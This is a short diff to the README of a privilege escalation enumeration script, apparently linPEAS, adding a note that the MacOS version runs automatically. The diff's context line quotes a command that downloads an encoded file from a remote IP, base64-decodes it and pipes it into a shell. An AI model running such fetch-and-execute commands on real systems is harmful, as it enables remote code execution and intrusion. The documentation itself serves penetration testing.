@@ -50,6 +50,10 @@ curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 
 **Use the parameter `-a` to execute all these checks.**
 
+## MacPEAS
+
+Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
+
 ## Basic Information
 
 The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD and OpenBSD).
